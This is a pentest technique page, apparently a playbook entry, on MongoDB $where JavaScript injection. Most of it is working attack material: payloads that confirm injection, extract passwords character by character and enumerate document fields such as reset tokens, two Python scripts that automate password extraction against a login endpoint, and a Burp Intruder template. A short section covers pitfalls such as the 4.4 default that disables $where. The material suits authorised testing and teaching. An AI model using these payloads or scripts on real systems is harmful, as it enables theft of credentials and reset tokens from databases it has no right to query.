# MongoDB `$where` / JavaScript Injection

## When this applies

- MongoDB query uses `$where` operator, which evaluates a JavaScript predicate against each document.
- Application allows user input to flow into the `$where` string (e.g. `{$where: "this.user == '" + req.body.user + "'"}`).
- Or the application allows user-controlled `mapReduce` / aggregation `$function` operators.

## Technique

The `$where` operator runs full JavaScript inside MongoDB's V8/SpiderMonkey context. User input concatenated into `$where` allows arbitrary JS execution against each document — which means schema enumeration, character-by-character extraction, and even DoS via infinite loops.

## Steps

### 1. Confirm `$where` is reachable

```json
{"$where": "1"}
{"$where": "true"}
{"$where": "this.username == 'admin'"}
```

If the response differs based on truthiness of the `$where` expression, JS injection works.

### 2. Inject into existing `$where` context

When source shows `$where: "this.user == '" + input + "'"`:

```javascript
admin' && this.password.length == 8 || 'a'=='b
admin' && this.password.length < 30 || 'a'=='b
admin' && this.password.length > 5 || 'a'=='b
```

Pattern: close the string, AND with the test condition, OR with a false comparison to drop the trailing `'`.

### 3. Character-by-character extraction (array access)

```javascript
admin' && this.password[0]=='a' || 'a'=='b
admin' && this.password[1]=='b' || 'a'=='b
```

Or with `charAt`:
```javascript
admin' && this.password.charAt(0)=='a' || 'a'=='b
```

Or with `substring`/`substr`:
```javascript
admin' && this.password.substring(0,1)=='a' || 'a'=='b
admin' && this.password.substr(0,1)=='a' || 'a'=='b
```

### 4. Regex extraction (faster, supports anchoring)

```javascript
admin' && this.password.match('^a') || 'a'=='b
admin' && this.password.match('^.{2}c') || 'a'=='b
admin' && /^a/.test(this.password) || 'a'=='b
```

`match('^.{N}X')` checks that position N is character X — combine with binary search for log(charset) requests per character.

### 5. ASCII via `charCodeAt` (binary search)

```javascript
admin' && this.password.charCodeAt(0)==97 || 'a'=='b
```

Range probe: `charCodeAt(0) > 109` (binary search lower/upper half of charset).

### 6. Schema enumeration

```javascript
{"$where": "Object.keys(this).length == 5"}
{"$where": "Object.keys(this)[0] == '_id'"}
{"$where": "Object.keys(this)[1].match('^.{0}u.*')"}     // first char of field 1
{"$where": "'resetToken' in this"}
{"$where": "this.hasOwnProperty('resetToken')"}
{"$where": "typeof this.resetToken === 'string'"}
{"$where": "this.resetToken.length == 32"}
{"$where": "this.resetToken.match('^.{0}a.*')"}
```

### 7. Length determination

```javascript
this.password.length == 8           // exact
this.password.length < 30           // upper bound
this.password.length > 5            // lower bound
```

Bisect to find exact length quickly.

### 8. Python automation (boolean extraction)

```python
import requests, string

def extract_password(url, username, length):
    password = ""
    chars = string.ascii_lowercase + string.digits
    for position in range(length):
        for char in chars:
            payload = f"{username}' && this.password[{position}]=='{char}' || 'x'=='y"
            r = requests.get(url, params={'user': payload})
            if "Your username is:" in r.text:
                password += char
                break
    return password
```

### 9. Python automation (binary search via charCodeAt)

```python
def binary_search_char(url, username, position):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"{username}' && this.password.charCodeAt({position})>{mid} || 'x'=='y"
        r = requests.get(url, params={'user': payload})
        if "Your username is:" in r.text:
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

### 10. Burp Intruder configuration

- Attack type: Cluster Bomb (position × character).
- Payload set 1: numbers 0–32 (position).
- Payload set 2: `abcdefghijklmnopqrstuvwxyz0123456789` (character).
- Grep Match: `Your username is:` / `Account locked` / `Welcome back` (success indicator).
- Request template:
  ```http
  POST /login HTTP/1.1
  Content-Type: application/json

  {"username":"admin","password":"x","$where":"this.password[§0§]=='§a§'"}
  ```

## Verifying success

- Boolean payload `1` returns "found" page; `0` returns "not found" — `$where` is being evaluated.
- Character extraction converges on a value that, when used as the actual password, authenticates successfully.
- `Object.keys(this).length` returns a sensible field count consistent with the data model.

## Common pitfalls

- MongoDB ≥ 4.4 disabled `$where` server-side scripting by default (`security.javascriptEnabled: false`). On hardened deployments, `$where` returns `MongoError: $where is not allowed`.
- Application may sanitize `$` from input — switch to operator injection (`$ne`, `$regex`) which uses operator objects, not strings.
- Long-running `$where` predicates can block the event loop — be conscientious with `while(true)` loops in shared/lab environments.
- `Object.keys(this)` includes `_id` always; positional index 0 is usually `_id`, real fields start at 1.
- Character set: passwords often contain symbols (`!@#$%^&*`) — extend the charset beyond alphanumerics.

## Tools

- Burp Intruder (Cluster Bomb attack with grep match).
- NoSQLMap (`-u <url> --inject-where`).
- Custom Python (boolean / binary-search extraction).
- mongo shell for sandbox testing of crafted JS.
